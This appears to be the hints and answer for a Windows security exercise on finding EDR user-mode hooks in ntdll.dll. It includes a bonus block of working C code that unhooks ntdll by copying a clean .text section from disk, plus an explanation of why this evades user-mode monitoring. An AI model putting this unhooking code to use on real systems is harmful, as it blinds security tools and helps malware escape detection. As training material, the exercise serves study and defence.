=== HINT 1 ===
HMODULE mem_ntdll = GetModuleHandleA("ntdll.dll");

=== HINT 2 ===
char path[MAX_PATH];
GetSystemDirectoryA(path, MAX_PATH);
strcat_s(path, MAX_PATH, "\\ntdll.dll");
HANDLE hFile    = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);
HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
PVOID  disk_ntdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);


// Use find_section() helper already in the exercise file
PIMAGE_SECTION_HEADER mem_text  = find_section(mem_ntdll,  ".text");
PIMAGE_SECTION_HEADER disk_text = find_section(disk_ntdll, ".text");

=== HINT 3 (SPOILER) ===
BYTE *mem_bytes  = (BYTE*)mem_ntdll  + mem_text->VirtualAddress;
BYTE *disk_bytes = (BYTE*)disk_ntdll + disk_text->PointerToRawData;
// Compare first N bytes for hook signatures (JMP/CALL opcode = E9/FF)

=== BONUS: Unhook ===
DWORD old;
VirtualProtect(mem_bytes, mem_text->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old);
memcpy(mem_bytes, disk_bytes, mem_text->Misc.VirtualSize);
VirtualProtect(mem_bytes, mem_text->Misc.VirtualSize, old, &old);

=== KEY INSIGHT ===
EDR hooks look like: E9 XX XX XX XX (JMP rel32) at the start of syscall stubs.
The first 4-8 bytes of NtAllocateVirtualMemory etc. are overwritten with a trampoline
that redirects to the EDR's inspection code before invoking the real syscall.
Unhooking by mapping a clean copy evades user-mode hooks entirely.
Kernel callbacks (PsSetCreateProcessNotifyRoutine, minifilters) are unaffected -
they live in kernel space and cannot be patched from user mode.
